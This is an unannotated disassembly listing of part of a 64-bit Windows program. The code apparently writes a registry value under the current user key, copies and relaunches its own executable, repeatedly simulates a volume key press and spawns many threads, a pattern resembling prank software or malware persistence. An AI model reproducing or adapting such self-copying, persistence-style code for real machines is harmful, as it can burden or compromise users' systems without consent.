   140003c14:	e8 f7 26 00 00       	call   0x140006310
   140003c19:	90                   	nop
   140003c1a:	48 8b 95 a8 00 00 00 	mov    0xa8(%rbp),%rdx
   140003c21:	48 83 fa 07          	cmp    $0x7,%rdx
   140003c25:	76 4b                	jbe    0x140003c72
   140003c27:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003c2e:	00 
   140003c2f:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140003c36:	48 8b c1             	mov    %rcx,%rax
   140003c39:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003c40:	72 2b                	jb     0x140003c6d
   140003c42:	48 83 c2 27          	add    $0x27,%rdx
   140003c46:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003c4a:	48 2b c1             	sub    %rcx,%rax
   140003c4d:	48 83 e8 08          	sub    $0x8,%rax
   140003c51:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003c55:	76 16                	jbe    0x140003c6d
   140003c57:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003c5c:	45 33 c9             	xor    %r9d,%r9d
   140003c5f:	45 33 c0             	xor    %r8d,%r8d
   140003c62:	33 d2                	xor    %edx,%edx
   140003c64:	33 c9                	xor    %ecx,%ecx
   140003c66:	ff 15 64 58 00 00    	call   *0x5864(%rip)        # 0x1400094d0
   140003c6c:	cc                   	int3
   140003c6d:	e8 6e 32 00 00       	call   0x140006ee0
   140003c72:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   140003c79:	48 33 cc             	xor    %rsp,%rcx
   140003c7c:	e8 3f 32 00 00       	call   0x140006ec0
   140003c81:	4c 8d 9c 24 c0 02 00 	lea    0x2c0(%rsp),%r11
   140003c88:	00 
   140003c89:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140003c8d:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140003c91:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140003c95:	49 8b e3             	mov    %r11,%rsp
   140003c98:	5d                   	pop    %rbp
   140003c99:	c3                   	ret
   140003c9a:	cc                   	int3
   140003c9b:	cc                   	int3
   140003c9c:	cc                   	int3
   140003c9d:	cc                   	int3
   140003c9e:	cc                   	int3
   140003c9f:	cc                   	int3
   140003ca0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003ca5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003caa:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003caf:	55                   	push   %rbp
   140003cb0:	41 56                	push   %r14
   140003cb2:	41 57                	push   %r15
   140003cb4:	48 8d ac 24 10 f6 ff 	lea    -0x9f0(%rsp),%rbp
   140003cbb:	ff 
   140003cbc:	48 81 ec f0 0a 00 00 	sub    $0xaf0,%rsp
   140003cc3:	48 8b 05 76 a3 00 00 	mov    0xa376(%rip),%rax        # 0x14000e040
   140003cca:	48 33 c4             	xor    %rsp,%rax
   140003ccd:	48 89 85 e0 09 00 00 	mov    %rax,0x9e0(%rbp)
   140003cd4:	48 8b d9             	mov    %rcx,%rbx
   140003cd7:	33 c9                	xor    %ecx,%ecx
   140003cd9:	ff 15 11 59 00 00    	call   *0x5911(%rip)        # 0x1400095f0
   140003cdf:	8b c8                	mov    %eax,%ecx
   140003ce1:	ff 15 21 59 00 00    	call   *0x5921(%rip)        # 0x140009608
   140003ce7:	8b 05 77 63 00 00    	mov    0x6377(%rip),%eax        # 0x14000a064
   140003ced:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003cf1:	89 85 90 01 00 00    	mov    %eax,0x190(%rbp)
   140003cf7:	33 f6                	xor    %esi,%esi
   140003cf9:	0f b7 05 68 63 00 00 	movzwl 0x6368(%rip),%eax        # 0x14000a068
   140003d00:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003d03:	66 89 85 94 01 00 00 	mov    %ax,0x194(%rbp)
   140003d0a:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003d0d:	48 8d 05 2c e1 ff ff 	lea    -0x1ed4(%rip),%rax        # 0x140001e40
   140003d14:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
   140003d18:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140003d1c:	48 8d 85 90 01 00 00 	lea    0x190(%rbp),%rax
   140003d23:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140003d27:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
   140003d2b:	66 0f 7f 45 00       	movdqa %xmm0,0x0(%rbp)
   140003d30:	66 0f 7f 4d 10       	movdqa %xmm1,0x10(%rbp)
   140003d35:	48 89 5d f8          	mov    %rbx,-0x8(%rbp)
   140003d39:	ff 15 a1 56 00 00    	call   *0x56a1(%rip)        # 0x1400093e0
   140003d3f:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140003d44:	4c 8d 05 25 63 00 00 	lea    0x6325(%rip),%r8        # 0x14000a070
   140003d4b:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140003d50:	48 8d 95 90 01 00 00 	lea    0x190(%rbp),%rdx
   140003d57:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140003d5c:	45 33 c9             	xor    %r9d,%r9d
   140003d5f:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003d64:	33 c9                	xor    %ecx,%ecx
   140003d66:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140003d6d:	80 
   140003d6e:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140003d75:	80 
   140003d76:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140003d7d:	80 
   140003d7e:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140003d85:	80 
   140003d86:	ff 15 dc 55 00 00    	call   *0x55dc(%rip)        # 0x140009368
   140003d8c:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   140003d92:	45 33 c0             	xor    %r8d,%r8d
   140003d95:	48 8b c8             	mov    %rax,%rcx
   140003d98:	ba 01 00 00 00       	mov    $0x1,%edx
   140003d9d:	48 8b f8             	mov    %rax,%rdi
   140003da0:	ff 15 32 56 00 00    	call   *0x5632(%rip)        # 0x1400093d8
   140003da6:	bb 32 00 00 00       	mov    $0x32,%ebx
   140003dab:	49 bf 7f 0f 05 fd ff 	movabs $0x7ffffffffd050f7f,%r15
   140003db2:	ff ff 7f 
   140003db5:	49 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r14
   140003dbc:	ff ff 7f 
   140003dbf:	90                   	nop
   140003dc0:	45 33 c9             	xor    %r9d,%r9d
   140003dc3:	45 33 c0             	xor    %r8d,%r8d
   140003dc6:	33 d2                	xor    %edx,%edx
   140003dc8:	b1 af                	mov    $0xaf,%cl
   140003dca:	ff 15 90 55 00 00    	call   *0x5590(%rip)        # 0x140009360
   140003dd0:	45 33 c9             	xor    %r9d,%r9d
   140003dd3:	33 d2                	xor    %edx,%edx
   140003dd5:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003ddb:	b1 af                	mov    $0xaf,%cl
   140003ddd:	ff 15 7d 55 00 00    	call   *0x557d(%rip)        # 0x140009360
   140003de3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003de8:	e8 33 d2 ff ff       	call   0x140001020
   140003ded:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140003df2:	49 3b c7             	cmp    %r15,%rax
   140003df5:	7d 0c                	jge    0x140003e03
   140003df7:	48 05 80 f0 fa 02    	add    $0x2faf080,%rax
   140003dfd:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140003e01:	eb 04                	jmp    0x140003e07
   140003e03:	4c 89 75 30          	mov    %r14,0x30(%rbp)
   140003e07:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140003e0b:	e8 80 22 00 00       	call   0x140006090
   140003e10:	48 83 eb 01          	sub    $0x1,%rbx
   140003e14:	75 aa                	jne    0x140003dc0
   140003e16:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003e1b:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140003e20:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003e25:	48 8d 15 f4 5e 00 00 	lea    0x5ef4(%rip),%rdx        # 0x140009d20
   140003e2c:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003e31:	45 33 c9             	xor    %r9d,%r9d
   140003e34:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   140003e3b:	00 
   140003e3c:	45 33 c0             	xor    %r8d,%r8d
   140003e3f:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140003e46:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003e4a:	c7 45 30 01 00 00 00 	movl   $0x1,0x30(%rbp)
   140003e51:	ff 15 d9 51 00 00    	call   *0x51d9(%rip)        # 0x140009030
   140003e57:	85 c0                	test   %eax,%eax
   140003e59:	75 66                	jne    0x140003ec1
   140003e5b:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003e60:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140003e64:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003e6b:	00 
   140003e6c:	48 8d 15 25 5f 00 00 	lea    0x5f25(%rip),%rdx        # 0x140009d98
   140003e73:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003e79:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003e7e:	45 33 c0             	xor    %r8d,%r8d
   140003e81:	ff 15 91 51 00 00    	call   *0x5191(%rip)        # 0x140009018
   140003e87:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003e8c:	ff 15 ae 51 00 00    	call   *0x51ae(%rip)        # 0x140009040
   140003e92:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003e97:	4c 8d 0d 1a 5f 00 00 	lea    0x5f1a(%rip),%r9        # 0x140009db8
   140003e9e:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140003ea5:	00 
   140003ea6:	45 33 c0             	xor    %r8d,%r8d
   140003ea9:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003eae:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140003eb5:	00 
   140003eb6:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   140003ebb:	ff 15 df 54 00 00    	call   *0x54df(%rip)        # 0x1400093a0
   140003ec1:	ba 04 01 00 00       	mov    $0x104,%edx
   140003ec6:	48 8d 8d c0 05 00 00 	lea    0x5c0(%rbp),%rcx
   140003ecd:	ff 15 5d 52 00 00    	call   *0x525d(%rip)        # 0x140009130
   140003ed3:	85 c0                	test   %eax,%eax
   140003ed5:	0f 84 0e 01 00 00    	je     0x140003fe9
   140003edb:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003ee1:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   140003ee8:	33 c9                	xor    %ecx,%ecx
   140003eea:	ff 15 60 52 00 00    	call   *0x5260(%rip)        # 0x140009150
   140003ef0:	85 c0                	test   %eax,%eax
   140003ef2:	0f 84 f1 00 00 00    	je     0x140003fe9
   140003ef8:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   140003eff:	48 8d 8d b0 03 00 00 	lea    0x3b0(%rbp),%rcx
   140003f06:	ff 15 64 51 00 00    	call   *0x5164(%rip)        # 0x140009070
   140003f0c:	48 8d 8d b0 03 00 00 	lea    0x3b0(%rbp),%rcx
   140003f13:	ff 15 cf 53 00 00    	call   *0x53cf(%rip)        # 0x1400092e8
   140003f19:	48 8d 95 c0 05 00 00 	lea    0x5c0(%rbp),%rdx
   140003f20:	48 8d 8d b0 03 00 00 	lea    0x3b0(%rbp),%rcx
   140003f27:	ff 15 b3 56 00 00    	call   *0x56b3(%rip)        # 0x1400095e0
   140003f2d:	85 c0                	test   %eax,%eax
   140003f2f:	0f 84 b4 00 00 00    	je     0x140003fe9
   140003f35:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   140003f3c:	ff 15 b6 53 00 00    	call   *0x53b6(%rip)        # 0x1400092f8
   140003f42:	4c 8b c0             	mov    %rax,%r8
   140003f45:	48 8d 95 c0 05 00 00 	lea    0x5c0(%rbp),%rdx
   140003f4c:	48 8d 8d d0 07 00 00 	lea    0x7d0(%rbp),%rcx
   140003f53:	ff 15 97 53 00 00    	call   *0x5397(%rip)        # 0x1400092f0
   140003f59:	45 33 c0             	xor    %r8d,%r8d
   140003f5c:	48 8d 95 d0 07 00 00 	lea    0x7d0(%rbp),%rdx
   140003f63:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   140003f6a:	ff 15 f8 50 00 00    	call   *0x50f8(%rip)        # 0x140009068
   140003f70:	85 c0                	test   %eax,%eax
   140003f72:	75 0b                	jne    0x140003f7f
   140003f74:	ff 15 a6 51 00 00    	call   *0x51a6(%rip)        # 0x140009120
   140003f7a:	83 f8 20             	cmp    $0x20,%eax
   140003f7d:	75 6a                	jne    0x140003fe9
   140003f7f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003f82:	c7 44 24 70 70 00 00 	movl   $0x70,0x70(%rsp)
   140003f89:	00 
   140003f8a:	33 c0                	xor    %eax,%eax
   140003f8c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140003f91:	48 89 45 d4          	mov    %rax,-0x2c(%rbp)
   140003f95:	89 45 dc             	mov    %eax,-0x24(%rbp)
   140003f98:	48 8d 05 b1 58 00 00 	lea    0x58b1(%rip),%rax        # 0x140009850
   140003f9f:	0f 11 44 24 74       	movups %xmm0,0x74(%rsp)
   140003fa4:	c7 44 24 74 40 00 00 	movl   $0x40,0x74(%rsp)
   140003fab:	00 
   140003fac:	0f 11 45 84          	movups %xmm0,-0x7c(%rbp)
   140003fb0:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140003fb4:	48 8d 85 d0 07 00 00 	lea    0x7d0(%rbp),%rax
   140003fbb:	0f 11 45 94          	movups %xmm0,-0x6c(%rbp)
   140003fbf:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   140003fc3:	0f 11 45 a4          	movups %xmm0,-0x5c(%rbp)
   140003fc7:	c7 45 a0 01 00 00 00 	movl   $0x1,-0x60(%rbp)
   140003fce:	0f 11 45 b4          	movups %xmm0,-0x4c(%rbp)
   140003fd2:	0f 11 45 c4          	movups %xmm0,-0x3c(%rbp)
   140003fd6:	ff 15 f4 52 00 00    	call   *0x52f4(%rip)        # 0x1400092d0
   140003fdc:	85 c0                	test   %eax,%eax
   140003fde:	74 09                	je     0x140003fe9
   140003fe0:	33 c9                	xor    %ecx,%ecx
   140003fe2:	ff 15 78 50 00 00    	call   *0x5078(%rip)        # 0x140009060
   140003fe8:	cc                   	int3
   140003fe9:	e8 e2 e3 ff ff       	call   0x1400023d0
   140003fee:	e8 bd f8 ff ff       	call   0x1400038b0
   140003ff3:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003ff8:	e8 eb 2e 00 00       	call   0x140006ee8
   140003ffd:	48 8d 0d 0c d4 ff ff 	lea    -0x2bf4(%rip),%rcx        # 0x140001410
   140004004:	4c 8b c8             	mov    %rax,%r9
   140004007:	4c 8d 05 52 25 00 00 	lea    0x2552(%rip),%r8        # 0x140006560
   14000400e:	33 d2                	xor    %edx,%edx
   140004010:	48 89 08             	mov    %rcx,(%rax)
   140004013:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   14000401a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000401f:	33 c9                	xor    %ecx,%ecx
   140004021:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004025:	ff 15 f5 54 00 00    	call   *0x54f5(%rip)        # 0x140009520
   14000402b:	48 89 85 50 01 00 00 	mov    %rax,0x150(%rbp)
   140004032:	48 85 c0             	test   %rax,%rax
   140004035:	0f 84 64 0c 00 00    	je     0x140004c9f
   14000403b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004040:	e8 a3 2e 00 00       	call   0x140006ee8
   140004045:	48 8d 0d c4 d4 ff ff 	lea    -0x2b3c(%rip),%rcx        # 0x140001510
   14000404c:	4c 8b c8             	mov    %rax,%r9
   14000404f:	4c 8d 05 0a 25 00 00 	lea    0x250a(%rip),%r8        # 0x140006560
   140004056:	33 d2                	xor    %edx,%edx
   140004058:	48 89 08             	mov    %rcx,(%rax)
   14000405b:	48 8d 8d 48 01 00 00 	lea    0x148(%rbp),%rcx
   140004062:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004067:	33 c9                	xor    %ecx,%ecx
   140004069:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000406d:	ff 15 ad 54 00 00    	call   *0x54ad(%rip)        # 0x140009520
   140004073:	48 89 85 40 01 00 00 	mov    %rax,0x140(%rbp)
   14000407a:	48 85 c0             	test   %rax,%rax
   14000407d:	0f 84 0a 0c 00 00    	je     0x140004c8d
   140004083:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004088:	e8 5b 2e 00 00       	call   0x140006ee8
   14000408d:	48 8d 0d 3c d5 ff ff 	lea    -0x2ac4(%rip),%rcx        # 0x1400015d0
   140004094:	4c 8b c8             	mov    %rax,%r9
   140004097:	4c 8d 05 c2 24 00 00 	lea    0x24c2(%rip),%r8        # 0x140006560
   14000409e:	33 d2                	xor    %edx,%edx
   1400040a0:	48 89 08             	mov    %rcx,(%rax)
   1400040a3:	48 8d 8d 38 01 00 00 	lea    0x138(%rbp),%rcx
   1400040aa:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400040af:	33 c9                	xor    %ecx,%ecx
   1400040b1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400040b5:	ff 15 65 54 00 00    	call   *0x5465(%rip)        # 0x140009520
   1400040bb:	48 89 85 30 01 00 00 	mov    %rax,0x130(%rbp)
   1400040c2:	48 85 c0             	test   %rax,%rax
   1400040c5:	0f 84 b0 0b 00 00    	je     0x140004c7b
   1400040cb:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400040d0:	e8 13 2e 00 00       	call   0x140006ee8
   1400040d5:	48 8d 0d a4 d5 ff ff 	lea    -0x2a5c(%rip),%rcx        # 0x140001680
   1400040dc:	4c 8b c8             	mov    %rax,%r9
   1400040df:	4c 8d 05 7a 24 00 00 	lea    0x247a(%rip),%r8        # 0x140006560
   1400040e6:	33 d2                	xor    %edx,%edx
   1400040e8:	48 89 08             	mov    %rcx,(%rax)
   1400040eb:	48 8d 8d 28 01 00 00 	lea    0x128(%rbp),%rcx
   1400040f2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400040f7:	33 c9                	xor    %ecx,%ecx
   1400040f9:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400040fd:	ff 15 1d 54 00 00    	call   *0x541d(%rip)        # 0x140009520
   140004103:	48 89 85 20 01 00 00 	mov    %rax,0x120(%rbp)
   14000410a:	48 85 c0             	test   %rax,%rax
   14000410d:	0f 84 56 0b 00 00    	je     0x140004c69
   140004113:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004118:	e8 cb 2d 00 00       	call   0x140006ee8
   14000411d:	48 8d 0d ec d5 ff ff 	lea    -0x2a14(%rip),%rcx        # 0x140001710
   140004124:	4c 8b c8             	mov    %rax,%r9
   140004127:	4c 8d 05 32 24 00 00 	lea    0x2432(%rip),%r8        # 0x140006560
   14000412e:	33 d2                	xor    %edx,%edx
   140004130:	48 89 08             	mov    %rcx,(%rax)
   140004133:	48 8d 8d 18 01 00 00 	lea    0x118(%rbp),%rcx
   14000413a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000413f:	33 c9                	xor    %ecx,%ecx
   140004141:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004145:	ff 15 d5 53 00 00    	call   *0x53d5(%rip)        # 0x140009520
   14000414b:	48 89 85 10 01 00 00 	mov    %rax,0x110(%rbp)
   140004152:	48 85 c0             	test   %rax,%rax
   140004155:	0f 84 fc 0a 00 00    	je     0x140004c57
   14000415b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004160:	e8 83 2d 00 00       	call   0x140006ee8
   140004165:	48 8d 0d a4 d6 ff ff 	lea    -0x295c(%rip),%rcx        # 0x140001810
   14000416c:	4c 8b c8             	mov    %rax,%r9
   14000416f:	4c 8d 05 ea 23 00 00 	lea    0x23ea(%rip),%r8        # 0x140006560
   140004176:	33 d2                	xor    %edx,%edx
   140004178:	48 89 08             	mov    %rcx,(%rax)
   14000417b:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   140004182:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004187:	33 c9                	xor    %ecx,%ecx
   140004189:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000418d:	ff 15 8d 53 00 00    	call   *0x538d(%rip)        # 0x140009520
   140004193:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   14000419a:	48 85 c0             	test   %rax,%rax
   14000419d:	0f 84 a2 0a 00 00    	je     0x140004c45
   1400041a3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400041a8:	e8 3b 2d 00 00       	call   0x140006ee8
   1400041ad:	48 8d 0d 2c d7 ff ff 	lea    -0x28d4(%rip),%rcx        # 0x1400018e0
   1400041b4:	4c 8b c8             	mov    %rax,%r9
   1400041b7:	4c 8d 05 a2 23 00 00 	lea    0x23a2(%rip),%r8        # 0x140006560
   1400041be:	33 d2                	xor    %edx,%edx
   1400041c0:	48 89 08             	mov    %rcx,(%rax)
   1400041c3:	48 8d 8d f8 00 00 00 	lea    0xf8(%rbp),%rcx
   1400041ca:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400041cf:	33 c9                	xor    %ecx,%ecx
   1400041d1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400041d5:	ff 15 45 53 00 00    	call   *0x5345(%rip)        # 0x140009520
   1400041db:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   1400041e2:	48 85 c0             	test   %rax,%rax
   1400041e5:	0f 84 48 0a 00 00    	je     0x140004c33
   1400041eb:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400041f0:	e8 f3 2c 00 00       	call   0x140006ee8
   1400041f5:	48 8d 0d b4 d7 ff ff 	lea    -0x284c(%rip),%rcx        # 0x1400019b0
   1400041fc:	4c 8b c8             	mov    %rax,%r9
   1400041ff:	4c 8d 05 5a 23 00 00 	lea    0x235a(%rip),%r8        # 0x140006560
   140004206:	33 d2                	xor    %edx,%edx
   140004208:	48 89 08             	mov    %rcx,(%rax)
   14000420b:	48 8d 8d e8 00 00 00 	lea    0xe8(%rbp),%rcx
   140004212:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004217:	33 c9                	xor    %ecx,%ecx
   140004219:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000421d:	ff 15 fd 52 00 00    	call   *0x52fd(%rip)        # 0x140009520
   140004223:	48 89 85 e0 00 00 00 	mov    %rax,0xe0(%rbp)
   14000422a:	48 85 c0             	test   %rax,%rax
   14000422d:	0f 84 ee 09 00 00    	je     0x140004c21
   140004233:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004238:	e8 ab 2c 00 00       	call   0x140006ee8
   14000423d:	48 8d 0d 0c d8 ff ff 	lea    -0x27f4(%rip),%rcx        # 0x140001a50
   140004244:	4c 8b c8             	mov    %rax,%r9
   140004247:	4c 8d 05 12 23 00 00 	lea    0x2312(%rip),%r8        # 0x140006560
   14000424e:	33 d2                	xor    %edx,%edx
   140004250:	48 89 08             	mov    %rcx,(%rax)
   140004253:	48 8d 8d d8 00 00 00 	lea    0xd8(%rbp),%rcx
   14000425a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000425f:	33 c9                	xor    %ecx,%ecx
   140004261:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004265:	ff 15 b5 52 00 00    	call   *0x52b5(%rip)        # 0x140009520
   14000426b:	48 89 85 d0 00 00 00 	mov    %rax,0xd0(%rbp)
   140004272:	48 85 c0             	test   %rax,%rax
   140004275:	0f 84 94 09 00 00    	je     0x140004c0f
   14000427b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004280:	e8 63 2c 00 00       	call   0x140006ee8
   140004285:	48 8d 0d c4 d9 ff ff 	lea    -0x263c(%rip),%rcx        # 0x140001c50
   14000428c:	4c 8b c8             	mov    %rax,%r9
   14000428f:	4c 8d 05 ca 22 00 00 	lea    0x22ca(%rip),%r8        # 0x140006560
   140004296:	33 d2                	xor    %edx,%edx
   140004298:	48 89 08             	mov    %rcx,(%rax)
   14000429b:	48 8d 8d c8 00 00 00 	lea    0xc8(%rbp),%rcx
   1400042a2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400042a7:	33 c9                	xor    %ecx,%ecx
   1400042a9:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400042ad:	ff 15 6d 52 00 00    	call   *0x526d(%rip)        # 0x140009520
   1400042b3:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   1400042ba:	48 85 c0             	test   %rax,%rax
   1400042bd:	0f 84 3a 09 00 00    	je     0x140004bfd
   1400042c3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400042c8:	e8 1b 2c 00 00       	call   0x140006ee8
   1400042cd:	48 8d 0d 7c da ff ff 	lea    -0x2584(%rip),%rcx        # 0x140001d50
   1400042d4:	4c 8b c8             	mov    %rax,%r9
   1400042d7:	4c 8d 05 82 22 00 00 	lea    0x2282(%rip),%r8        # 0x140006560
   1400042de:	33 d2                	xor    %edx,%edx
   1400042e0:	48 89 08             	mov    %rcx,(%rax)
   1400042e3:	48 8d 8d b8 00 00 00 	lea    0xb8(%rbp),%rcx
   1400042ea:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400042ef:	33 c9                	xor    %ecx,%ecx
   1400042f1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400042f5:	ff 15 25 52 00 00    	call   *0x5225(%rip)        # 0x140009520
   1400042fb:	48 89 85 b0 00 00 00 	mov    %rax,0xb0(%rbp)
   140004302:	48 85 c0             	test   %rax,%rax
   140004305:	0f 84 e0 08 00 00    	je     0x140004beb
   14000430b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004310:	e8 d3 2b 00 00       	call   0x140006ee8
   140004315:	48 8d 0d 64 db ff ff 	lea    -0x249c(%rip),%rcx        # 0x140001e80
   14000431c:	4c 8b c8             	mov    %rax,%r9
   14000431f:	4c 8d 05 3a 22 00 00 	lea    0x223a(%rip),%r8        # 0x140006560
   140004326:	33 d2                	xor    %edx,%edx
   140004328:	48 89 08             	mov    %rcx,(%rax)
   14000432b:	48 8d 8d a8 00 00 00 	lea    0xa8(%rbp),%rcx
   140004332:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004337:	33 c9                	xor    %ecx,%ecx
   140004339:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000433d:	ff 15 dd 51 00 00    	call   *0x51dd(%rip)        # 0x140009520
   140004343:	48 89 85 a0 00 00 00 	mov    %rax,0xa0(%rbp)
   14000434a:	48 85 c0             	test   %rax,%rax
   14000434d:	0f 84 86 08 00 00    	je     0x140004bd9
   140004353:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004358:	e8 8b 2b 00 00       	call   0x140006ee8
   14000435d:	48 8d 0d 0c dc ff ff 	lea    -0x23f4(%rip),%rcx        # 0x140001f70
   140004364:	4c 8b c8             	mov    %rax,%r9
   140004367:	4c 8d 05 f2 21 00 00 	lea    0x21f2(%rip),%r8        # 0x140006560
   14000436e:	33 d2                	xor    %edx,%edx
   140004370:	48 89 08             	mov    %rcx,(%rax)
   140004373:	48 8d 8d 98 00 00 00 	lea    0x98(%rbp),%rcx
   14000437a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000437f:	33 c9                	xor    %ecx,%ecx
   140004381:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004385:	ff 15 95 51 00 00    	call   *0x5195(%rip)        # 0x140009520
   14000438b:	48 89 85 90 00 00 00 	mov    %rax,0x90(%rbp)
   140004392:	48 85 c0             	test   %rax,%rax
   140004395:	0f 84 2c 08 00 00    	je     0x140004bc7
   14000439b:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400043a0:	e8 43 2b 00 00       	call   0x140006ee8
   1400043a5:	48 8d 0d 14 dd ff ff 	lea    -0x22ec(%rip),%rcx        # 0x1400020c0
   1400043ac:	4c 8b c8             	mov    %rax,%r9
   1400043af:	4c 8d 05 aa 21 00 00 	lea    0x21aa(%rip),%r8        # 0x140006560
   1400043b6:	33 d2                	xor    %edx,%edx
   1400043b8:	48 89 08             	mov    %rcx,(%rax)
   1400043bb:	48 8d 8d 88 00 00 00 	lea    0x88(%rbp),%rcx
   1400043c2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400043c7:	33 c9                	xor    %ecx,%ecx
   1400043c9:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400043cd:	ff 15 4d 51 00 00    	call   *0x514d(%rip)        # 0x140009520
   1400043d3:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   1400043da:	48 85 c0             	test   %rax,%rax
   1400043dd:	0f 84 d2 07 00 00    	je     0x140004bb5
   1400043e3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400043e8:	e8 fb 2a 00 00       	call   0x140006ee8
   1400043ed:	48 8d 0d fc dd ff ff 	lea    -0x2204(%rip),%rcx        # 0x1400021f0
